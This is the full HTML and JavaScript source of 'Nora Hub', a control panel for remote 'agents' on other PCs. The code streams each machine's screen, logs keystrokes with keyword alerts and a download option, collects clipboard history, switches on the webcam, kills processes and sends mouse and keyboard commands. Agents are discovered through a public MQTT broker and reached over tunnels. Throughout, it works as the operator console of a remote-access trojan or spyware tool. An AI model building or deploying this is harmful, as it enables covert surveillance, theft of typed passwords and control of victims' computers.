<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nora Hub</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mqtt/5.3.5/mqtt.min.js"></script>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg: #0d0d0d;
    --surface: #161616;
    --surface2: #1e1e1e;
    --border: #2a2a2a;
    --accent: #00e5ff;
    --accent2: #7c3aed;
    --green: #22c55e;
    --red: #ef4444;
    --yellow: #f59e0b;
    --text: #e5e5e5;
    --muted: #666;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Segoe UI', system-ui, sans-serif;
    font-size: 13px;
    height: 100vh;
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }

  /* ── Top Bar ── */
  #topbar {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 0 16px;
    height: 46px;
    background: var(--surface);
    border-bottom: 1px solid var(--border);
    flex-shrink: 0;
  }
  #topbar .logo { font-size: 15px; font-weight: 700; color: var(--accent); letter-spacing: 1px; }
  #topbar .logo span { color: var(--muted); font-weight: 400; }
  #topbar .spacer { flex: 1; }
  #tunnel-bar {
    background: #052e0f;
    border: 1px solid var(--green);
    color: var(--green);
    padding: 3px 10px;
    border-radius: 4px;
    font-size: 11px;
    display: none;
  }
  .btn {
    padding: 6px 14px;
    border-radius: 5px;
    border: none;
    cursor: pointer;
    font-size: 12px;
    font-weight: 600;
    transition: opacity .15s;
  }
  .btn:hover { opacity: .8; }
  .btn-accent { background: var(--accent); color: #000; }
  .btn-ghost { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
  .btn-red { background: var(--red); color: #fff; }
  .btn-green { background: var(--green); color: #000; }

  /* ── Main Layout ── */
  #main {
    display: flex;
    flex: 1;
    overflow: hidden;
  }

  /* ── Agent Sidebar ── */
  #sidebar {
    width: 180px;
    background: var(--surface);
    border-right: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    overflow: hidden;
    flex-shrink: 0;
  }
  #sidebar-header {
    padding: 10px 12px 8px;
    font-size: 10px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--muted);
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  #agents-list {
    flex: 1;
    overflow-y: auto;
    padding: 6px;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  .agent-card {
    border: 1px solid var(--border);
    border-radius: 6px;
    overflow: hidden;
    cursor: pointer;
    transition: border-color .15s;
    background: var(--surface2);
    position: relative;
  }
  .agent-card:hover { border-color: var(--accent); }
  .agent-card.active { border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent); }
  .agent-thumb {
    width: 100%;
    height: 95px;
    background: #000;
    display: block;
    object-fit: cover;
  }
  .agent-info {
    padding: 6px 8px;
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .status-dot {
    width: 7px; height: 7px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .status-dot.online { background: var(--green); box-shadow: 0 0 4px var(--green); }
  .status-dot.offline { background: var(--red); }
  .status-dot.connecting { background: var(--yellow); animation: pulse 1s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
  .agent-name {
    font-size: 11px;
    font-weight: 600;
    flex: 1;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .agent-remove {
    background: none; border: none; color: var(--muted);
    cursor: pointer; font-size: 14px; line-height: 1; padding: 0 2px;
    flex-shrink: 0;
  }
  .agent-remove:hover { color: var(--red); }
  #no-agents {
    color: var(--muted);
    text-align: center;
    padding: 20px 10px;
    font-size: 11px;
    line-height: 1.6;
  }

  /* ── Center: Screen + Controls ── */
  #center {
    flex: 1;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    background: #000;
    position: relative;
  }
  #screen-wrap {
    flex: 1;
    position: relative;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  #screen {
    max-width: 100%;
    max-height: 100%;
    display: block;
    cursor: default;
  }
  #no-selection {
    color: var(--muted);
    text-align: center;
    font-size: 14px;
  }
  #no-selection p { margin-top: 8px; font-size: 12px; }
  #ctrl-bar {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 6px 10px;
    background: var(--surface);
    border-top: 1px solid var(--border);
    flex-shrink: 0;
  }
  #ctrl-bar label { display: flex; align-items: center; gap: 5px; cursor: pointer; }
  #ctrl-bar input[type=checkbox] { accent-color: var(--accent); }
  .ctrl-sep { width: 1px; height: 16px; background: var(--border); }
  #active-label {
    font-weight: 700;
    color: var(--accent);
    font-size: 12px;
  }

  /* ── Right Panel ── */
  #panel {
    width: 280px;
    background: var(--surface);
    border-left: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    overflow: hidden;
    flex-shrink: 0;
  }
  .tabs {
    display: flex;
    border-bottom: 1px solid var(--border);
    flex-shrink: 0;
  }
  .tab {
    flex: 1;
    padding: 9px 4px;
    text-align: center;
    font-size: 11px;
    font-weight: 600;
    cursor: pointer;
    color: var(--muted);
    border-bottom: 2px solid transparent;
    transition: color .15s, border-color .15s;
    text-transform: uppercase;
    letter-spacing: .5px;
  }
  .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
  .tab-content { display: none; flex: 1; overflow: hidden; flex-direction: column; }
  .tab-content.active { display: flex; }

  /* Keylog */
  #keylog-box {
    flex: 1;
    overflow-y: auto;
    padding: 10px;
    font-family: 'Cascadia Code', 'Consolas', monospace;
    font-size: 12px;
    line-height: 1.7;
    word-break: break-all;
    color: #ccc;
    white-space: pre-wrap;
  }
  #keylog-controls {
    padding: 8px;
    border-top: 1px solid var(--border);
    display: flex;
    gap: 6px;
    flex-shrink: 0;
  }
  #kw-input {
    flex: 1;
    background: var(--surface2);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 4px 8px;
    border-radius: 4px;
    font-size: 11px;
  }

  /* Clipboard */
  #clip-list {
    flex: 1;
    overflow-y: auto;
    padding: 6px;
    display: flex;
    flex-direction: column;
    gap: 4px;
  }
  .clip-item {
    background: var(--surface2);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 6px 8px;
    font-size: 11px;
    color: #ccc;
    cursor: pointer;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    transition: border-color .15s;
  }
  .clip-item:hover { border-color: var(--accent); }

  /* Processes */
  #proc-search {
    padding: 6px;
    border-bottom: 1px solid var(--border);
    flex-shrink: 0;
  }
  #proc-search input {
    width: 100%;
    background: var(--surface2);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 5px 8px;
    border-radius: 4px;
    font-size: 11px;
  }
  #proc-list {
    flex: 1;
    overflow-y: auto;
  }
  .proc-row {
    display: flex;
    align-items: center;
    padding: 4px 8px;
    border-bottom: 1px solid #1a1a1a;
    gap: 6px;
    font-size: 11px;
  }
  .proc-row:hover { background: var(--surface2); }
  .proc-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .proc-mem { color: var(--muted); min-width: 42px; text-align: right; font-size: 10px; }
  .proc-kill {
    background: none; border: 1px solid var(--red); color: var(--red);
    border-radius: 3px; padding: 1px 6px; cursor: pointer; font-size: 10px;
  }
  .proc-kill:hover { background: var(--red); color: #fff; }
  #proc-refresh {
    padding: 6px;
    border-top: 1px solid var(--border);
    flex-shrink: 0;
  }

  /* Modal */
  #modal-overlay {
    display: none;
    position: fixed; inset: 0;
    background: rgba(0,0,0,.7);
    z-index: 100;
    align-items: center;
    justify-content: center;
  }
  #modal-overlay.show { display: flex; }
  #modal {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 24px;
    width: 360px;
    display: flex;
    flex-direction: column;
    gap: 12px;
  }
  #modal h2 { font-size: 15px; color: var(--accent); }
  #modal label { font-size: 11px; color: var(--muted); display: block; margin-bottom: 4px; }
  #modal input {
    width: 100%;
    background: var(--surface2);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 8px 10px;
    border-radius: 5px;
    font-size: 13px;
  }
  #modal input:focus { outline: 1px solid var(--accent); }
  #modal .row { display: flex; gap: 8px; justify-content: flex-end; }

  /* Camera pip */
  #cam-pip {
    position: absolute;
    bottom: 10px; right: 10px;
    width: 160px; height: 120px;
    background: #000;
    border: 2px solid var(--accent2);
    border-radius: 6px;
    overflow: hidden;
    display: none;
  }
  #cam-pip img { width: 100%; height: 100%; object-fit: cover; }

  ::-webkit-scrollbar { width: 5px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
</style>
</head>
<body>

<!-- Top Bar -->
<div id="topbar">
  <div class="logo">NORA <span>HUB</span></div>
  <div id="tunnel-bar"></div>
  <div class="spacer"></div>
  <span id="active-label">No agent selected</span>
  <span id="mqtt-status" style="font-size:11px;color:var(--muted)">⬤ connecting...</span>
  <button class="btn btn-accent" onclick="openModal()">+ Add Agent</button>
</div>

<!-- Main -->
<div id="main">

  <!-- Sidebar -->
  <div id="sidebar">
    <div id="sidebar-header">
      Agents
      <span id="agent-count" style="color:var(--accent)">0</span>
    </div>
    <div id="agents-list">
      <div id="no-agents">No agents yet.<br>Click <b>+ Add Agent</b><br>to connect a PC.</div>
    </div>
  </div>

  <!-- Screen -->
  <div id="center">
    <div id="screen-wrap">
      <div id="no-selection">
        <div style="font-size:32px">🖥️</div>
        <p>Select an agent from the left</p>
      </div>
      <canvas id="screen" style="display:none"></canvas>
      <div id="cam-pip"><img id="cam-img" src="" alt=""></div>
    </div>
    <div id="ctrl-bar">
      <label><input type="checkbox" id="remote-chk" onchange="toggleRemote(this.checked)"> Remote Control</label>
      <div class="ctrl-sep"></div>
      <label><input type="checkbox" id="cam-chk" onchange="toggleCamera(this.checked)"> Camera</label>
      <div class="ctrl-sep"></div>
      <button class="btn btn-ghost" onclick="refreshProcesses()" style="padding:4px 10px;font-size:11px">↻ Processes</button>
    </div>
  </div>

  <!-- Right Panel -->
  <div id="panel">
    <div class="tabs">
      <div class="tab active" onclick="switchTab('keylog',this)">Keylog</div>
      <div class="tab" onclick="switchTab('clipboard',this)">Clipboard</div>
      <div class="tab" onclick="switchTab('processes',this)">Processes</div>
    </div>

    <!-- Keylog tab -->
    <div id="tab-keylog" class="tab-content active">
      <div id="keylog-box"></div>
      <div id="keylog-controls">
        <input id="kw-input" placeholder="Alert keyword..." onkeydown="if(event.key==='Enter')addKeyword()">
        <button class="btn btn-ghost" onclick="addKeyword()" style="padding:4px 10px">+</button>
        <button class="btn btn-ghost" onclick="saveKeylog()" style="padding:4px 10px">💾</button>
        <button class="btn btn-ghost" onclick="clearKeylog()" style="padding:4px 10px;color:var(--red)">✕</button>
      </div>
    </div>

    <!-- Clipboard tab -->
    <div id="tab-clipboard" class="tab-content">
      <div id="clip-list"></div>
    </div>

    <!-- Processes tab -->
    <div id="tab-processes" class="tab-content">
      <div id="proc-search"><input id="proc-filter" placeholder="Search processes..." oninput="renderProcesses()"></div>
      <div id="proc-list"></div>
      <div id="proc-refresh">
        <button class="btn btn-ghost" onclick="refreshProcesses()" style="width:100%;font-size:11px">↻ Refresh</button>
      </div>
    </div>
  </div>
</div>


<!-- Add Agent Modal -->
<div id="modal-overlay" onclick="if(event.target===this)closeModal()">
  <div id="modal">
    <h2>Connect Agent</h2>
    <div>
      <label>Agent Name</label>
      <input id="m-name" placeholder="e.g. Laptop A" maxlength="30">
    </div>
    <div>
      <label>Agent URL (localhost.run URL or local IP:port)</label>
      <input id="m-url" placeholder="https://abc.localhost.run or http://192.168.1.5:9090">
    </div>
    <div class="row">
      <button class="btn btn-ghost" onclick="closeModal()">Cancel</button>
      <button class="btn btn-accent" onclick="addAgent()">Connect</button>
    </div>
  </div>
</div>

<script>
// ── State ────────────────────────────────────────────────────────────────────
const agents   = {};   // id → { name, url, socket, status, keylog, clipboard, processes, lastFrame, thumbCtx }
let activeId   = null;
let remoteOn   = false;
let keywords   = [];
let alertCooldown = {};

const screen   = document.getElementById('screen');
const ctx      = screen.getContext('2d');
const noSel    = document.getElementById('no-selection');
const keylogEl = document.getElementById('keylog-box');
const clipEl   = document.getElementById('clip-list');
const procEl   = document.getElementById('proc-list');
const camPip   = document.getElementById('cam-pip');
const camImg   = document.getElementById('cam-img');

// ── Persist agents list ───────────────────────────────────────────────────────
function saveAgentsToStorage() {
  const data = Object.values(agents).map(a => ({ id: a.id, name: a.name, url: a.url }));
  try { localStorage.setItem('nora_hub_agents', JSON.stringify(data)); } catch(e) {}
}
function loadAgentsFromStorage() {
  try {
    const data = JSON.parse(localStorage.getItem('nora_hub_agents') || '[]');
    data.forEach(a => connectAgent(a.id, a.name, a.url));
  } catch(e) {}
}

// ── Modal ────────────────────────────────────────────────────────────────────
function openModal() {
  document.getElementById('modal-overlay').classList.add('show');
  document.getElementById('m-name').focus();
}
function closeModal() {
  document.getElementById('modal-overlay').classList.remove('show');
  document.getElementById('m-name').value = '';
  document.getElementById('m-url').value = '';
}
function addAgent() {
  const name = document.getElementById('m-name').value.trim() || 'Agent';
  let url    = document.getElementById('m-url').value.trim();
  if (!url) return;
  if (!/^https?:\/\//i.test(url)) url = 'http://' + url;
  url = url.replace(/\/$/, '');
  const id = 'a_' + Date.now();
  connectAgent(id, name, url);
  saveAgentsToStorage();
  closeModal();
}

// ── Connect ──────────────────────────────────────────────────────────────────
function connectAgent(id, name, url) {
  if (agents[id]) return;

  // Thumbnail canvas
  const thumbCanvas = document.createElement('canvas');
  thumbCanvas.width = 160; thumbCanvas.height = 95;
  thumbCanvas.className = 'agent-thumb';

  const agent = {
    id, name, url,
    socket: null,
    status: 'connecting',
    keylog: '',
    clipboard: [],
    processes: [],
    lastFrame: null,
    thumbCtx: thumbCanvas.getContext('2d'),
    thumbCanvas
  };
  agents[id] = agent;

  renderSidebar();

  const sock = io(url, {
    transports: ['polling', 'websocket'],
    reconnectionDelay: 2000,
    reconnectionAttempts: Infinity
  });
  agent.socket = sock;

  sock.on('connect', () => {
    agent.status = 'online';
    updateCard(id);
    if (activeId === id) setActiveLabel(name);
    sock.emit('request_processes');
  });

  sock.on('disconnect', () => {
    agent.status = 'offline';
    updateCard(id);
  });

  sock.on('connect_error', () => {
    agent.status = 'offline';
    updateCard(id);
  });

  sock.on('frame', d => {
    const img = new Image();
    img.onload = () => {
      // thumbnail
      agent.thumbCtx.drawImage(img, 0, 0, thumbCanvas.width, thumbCanvas.height);
      // main screen if active
      if (activeId === id) {
        screen.width  = img.naturalWidth;
        screen.height = img.naturalHeight;
        ctx.drawImage(img, 0, 0);
      }
    };
    img.src = 'data:image/jpeg;base64,' + d.data;
    agent.lastFrame = d.data;
  });

  sock.on('key', d => {
    agent.keylog += d.char;
    if (activeId === id) appendKey(d.char);
    // keyword alert
    keywords.forEach(kw => {
      if (agent.keylog.toLowerCase().includes(kw.toLowerCase())) {
        const k = id + kw;
        if (!alertCooldown[k]) {
          alertCooldown[k] = true;
          notify(`🚨 Keyword "${kw}" detected on ${name}`);
          setTimeout(() => delete alertCooldown[k], 10000);
        }
      }
    });
  });

  sock.on('clipboard', d => {
    if (agent.clipboard[0] === d.text) return;
    agent.clipboard.unshift(d.text);
    if (agent.clipboard.length > 100) agent.clipboard.pop();
    if (activeId === id) renderClipboard();
  });

  sock.on('processes_data', list => {
    agent.processes = list;
    if (activeId === id) renderProcesses();
  });

  sock.on('camera_frame', d => {
    if (activeId === id) {
      camImg.src = 'data:image/jpeg;base64,' + d.data;
      camPip.style.display = 'block';
    }
  });

  sock.on('camera_state', d => {
    if (activeId === id) {
      document.getElementById('cam-chk').checked = d.active;
      if (!d.active) camPip.style.display = 'none';
    }
  });

  sock.on('ngrok_url', d => {
    if (activeId === id) showTunnelBar(d.url);
  });
}

// ── Sidebar ───────────────────────────────────────────────────────────────────
function renderSidebar() {
  const list  = document.getElementById('agents-list');
  const noAg  = document.getElementById('no-agents');
  const count = document.getElementById('agent-count');
  const ids   = Object.keys(agents);
  count.textContent = ids.length;
  noAg.style.display = ids.length ? 'none' : 'block';
  // rebuild cards
  list.querySelectorAll('.agent-card').forEach(el => el.remove());
  ids.forEach(id => {
    const a = agents[id];
    const card = document.createElement('div');
    card.className = 'agent-card' + (activeId === id ? ' active' : '');
    card.id = 'card_' + id;
    card.onclick = () => selectAgent(id);
    const removeBtn = document.createElement('button');
    removeBtn.className = 'agent-remove';
    removeBtn.textContent = '×';
    removeBtn.title = 'Remove';
    removeBtn.onclick = e => { e.stopPropagation(); removeAgent(id); };
    const info = document.createElement('div');
    info.className = 'agent-info';
    const dot = document.createElement('div');
    dot.className = 'status-dot ' + a.status;
    dot.id = 'dot_' + id;
    const nm = document.createElement('div');
    nm.className = 'agent-name';
    nm.textContent = a.name;
    info.append(dot, nm, removeBtn);
    card.append(a.thumbCanvas, info);
    list.append(card);
  });
}

function updateCard(id) {
  const dot = document.getElementById('dot_' + id);
  if (dot) { dot.className = 'status-dot ' + agents[id].status; }
}

function removeAgent(id) {
  if (agents[id]) {
    agents[id].socket.disconnect();
    delete agents[id];
  }
  if (activeId === id) {
    activeId = null;
    screen.style.display = 'none';
    noSel.style.display = 'block';
    setActiveLabel('No agent selected');
    keylogEl.textContent = '';
    clipEl.innerHTML = '';
    procEl.innerHTML = '';
    camPip.style.display = 'none';
  }
  saveAgentsToStorage();
  renderSidebar();
}

// ── Select Agent ─────────────────────────────────────────────────────────────
function selectAgent(id) {
  activeId = id;
  const a = agents[id];

  // sidebar highlight
  document.querySelectorAll('.agent-card').forEach(c => c.classList.remove('active'));
  const card = document.getElementById('card_' + id);
  if (card) card.classList.add('active');

  // screen
  noSel.style.display = 'none';
  screen.style.display = 'block';
  if (a.lastFrame) {
    const img = new Image();
    img.onload = () => { screen.width = img.naturalWidth; screen.height = img.naturalHeight; ctx.drawImage(img,0,0); };
    img.src = 'data:image/jpeg;base64,' + a.lastFrame;
  }

  // ui
  setActiveLabel(a.name);
  document.getElementById('remote-chk').checked = false;
  remoteOn = false;
  screen.style.cursor = 'default';

  // panels
  keylogEl.textContent = a.keylog;
  keylogEl.scrollTop = keylogEl.scrollHeight;
  renderClipboard();
  renderProcesses();
  camPip.style.display = 'none';
}

function setActiveLabel(txt) {
  document.getElementById('active-label').textContent = txt;
}

// ── Keylog ────────────────────────────────────────────────────────────────────
function appendKey(char) {
  keylogEl.textContent += char;
  keylogEl.scrollTop = keylogEl.scrollHeight;
}
function saveKeylog() {
  const a = agents[activeId];
  if (!a) return;
  const blob = new Blob([a.keylog], { type: 'text/plain' });
  const url  = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url; link.download = a.name.replace(/\s+/g,'_') + '_keylog.txt';
  link.click(); URL.revokeObjectURL(url);
}
function clearKeylog() {
  const a = agents[activeId];
  if (!a) return;
  a.keylog = ''; keylogEl.textContent = '';
}
function addKeyword() {
  const kw = document.getElementById('kw-input').value.trim();
  if (!kw || keywords.includes(kw)) return;
  keywords.push(kw);
  document.getElementById('kw-input').value = '';
}

// ── Clipboard ─────────────────────────────────────────────────────────────────
function renderClipboard() {
  const a = agents[activeId];
  clipEl.innerHTML = '';
  if (!a) return;
  a.clipboard.forEach(txt => {
    const div = document.createElement('div');
    div.className = 'clip-item';
    div.textContent = txt;
    div.title = 'Click to copy';
    div.onclick = () => navigator.clipboard.writeText(txt).catch(() => {});
    clipEl.appendChild(div);
  });
}

// ── Processes ─────────────────────────────────────────────────────────────────
function renderProcesses() {
  const a = agents[activeId];
  procEl.innerHTML = '';
  if (!a) return;
  const filter = document.getElementById('proc-filter').value.toLowerCase();
  const list   = filter ? a.processes.filter(p => p.name.toLowerCase().includes(filter)) : a.processes;
  list.forEach(p => {
    const row = document.createElement('div');
    row.className = 'proc-row';
    row.innerHTML = `
      <span class="proc-name" title="${p.name}">${p.name}</span>
      <span class="proc-mem">${p.mem}MB</span>
      <button class="proc-kill" onclick="killProc(${p.pid})">Kill</button>`;
    procEl.appendChild(row);
  });
}
function refreshProcesses() {
  const a = agents[activeId];
  if (a && a.socket) a.socket.emit('request_processes');
}
function killProc(pid) {
  const a = agents[activeId];
  if (a && a.socket) a.socket.emit('kill_process', { pid });
}

// ── Camera ────────────────────────────────────────────────────────────────────
function toggleCamera(on) {
  const a = agents[activeId];
  if (!a || !a.socket) return;
  a.socket.emit(on ? 'camera_on' : 'camera_off');
  if (!on) camPip.style.display = 'none';
}

// ── Remote Control ───────────────────────────────────────────────────────────
function toggleRemote(on) {
  remoteOn = on;
  screen.style.cursor = on ? 'none' : 'default';
}

function sendCmd(data) {
  const a = agents[activeId];
  if (!a || !a.socket || !remoteOn) return;
  a.socket.emit('command', data);
}

screen.addEventListener('mousemove', e => {
  if (!remoteOn) return;
  const r = screen.getBoundingClientRect();
  sendCmd({ type: 'mousemove', x: (e.clientX - r.left) / r.width, y: (e.clientY - r.top) / r.height });
});
screen.addEventListener('mousedown', e => sendCmd({ type: 'mousedown', button: e.button }));
screen.addEventListener('mouseup',   e => sendCmd({ type: 'mouseup',   button: e.button }));
screen.addEventListener('wheel',     e => sendCmd({ type: 'scroll', dx: e.deltaX, dy: e.deltaY }), { passive: true });
screen.addEventListener('contextmenu', e => { if (remoteOn) e.preventDefault(); });

document.addEventListener('keydown', e => {
  if (!remoteOn || e.target !== document.body) return;
  sendCmd({ type: 'keydown', key: e.key });
});
document.addEventListener('keyup', e => {
  if (!remoteOn || e.target !== document.body) return;
  sendCmd({ type: 'keyup', key: e.key });
});

// ── Tunnel Bar ────────────────────────────────────────────────────────────────
function showTunnelBar(url) {
  const bar = document.getElementById('tunnel-bar');
  bar.textContent = '🌐 ' + url;
  bar.style.display = 'block';
}

// ── Tabs ──────────────────────────────────────────────────────────────────────
function switchTab(name, el) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
  el.classList.add('active');
  document.getElementById('tab-' + name).classList.add('active');
  if (name === 'processes') renderProcesses();
  if (name === 'clipboard') renderClipboard();
}

// ── Notifications ─────────────────────────────────────────────────────────────
function notify(msg) {
  if (Notification.permission === 'granted') {
    new Notification(msg);
  } else if (Notification.permission !== 'denied') {
    Notification.requestPermission().then(p => { if (p === 'granted') new Notification(msg); });
  }
}

// ── MQTT Auto-Discovery ───────────────────────────────────────────────────────
const MQTT_TOPIC = 'nora/7638d08dcd8340ef953c';
const mqttStatus = document.getElementById('mqtt-status');

const mqttClient = mqtt.connect('wss://broker.hivemq.com:8884/mqtt', {
  clientId: 'nora_hub_' + Math.random().toString(36).slice(2, 9),
  keepalive: 30,
  reconnectPeriod: 3000
});

mqttClient.on('connect', () => {
  mqttStatus.textContent = '⬤ live';
  mqttStatus.style.color = 'var(--green)';
  mqttClient.subscribe(MQTT_TOPIC + '/#');
});

mqttClient.on('reconnect', () => {
  mqttStatus.textContent = '⬤ reconnecting...';
  mqttStatus.style.color = 'var(--yellow)';
});

mqttClient.on('error', () => {
  mqttStatus.textContent = '⬤ error';
  mqttStatus.style.color = 'var(--red)';
});

mqttClient.on('message', (topic, message) => {
  const pcName   = decodeURIComponent(topic.split('/').pop()).replace(/_/g, ' ');
  const agentUrl = message.toString().trim();
  if (!agentUrl.startsWith('http')) return;

  const exists = Object.values(agents).find(a => a.name === pcName);
  if (!exists) {
    connectAgent('a_' + Date.now() + Math.random(), pcName, agentUrl);
  } else if (exists.url !== agentUrl) {
    removeAgent(exists.id);
    connectAgent('a_' + Date.now() + Math.random(), pcName, agentUrl);
  }
  saveAgentsToStorage();
});

// ── Init ──────────────────────────────────────────────────────────────────────
Notification.requestPermission();
loadAgentsFromStorage();
</script>
</body>
